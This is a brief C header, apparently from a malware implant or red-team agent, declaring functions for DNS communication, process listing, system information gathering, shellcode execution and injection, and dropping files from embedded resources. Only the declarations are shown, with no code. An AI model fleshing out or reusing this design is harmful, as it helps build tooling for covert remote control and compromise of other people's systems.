#include "DNSCommunication.h"

LPCSTR ProcessList();
LPCSTR SystemInfo();
LPCSTR ExecuteShellcode();
LPSTR AgentName();

DWORD WINAPI InjectShellcode(LPVOID lpData);
BOOL DropFileFromRes(LPCSTR fileName,DWORD resourceId);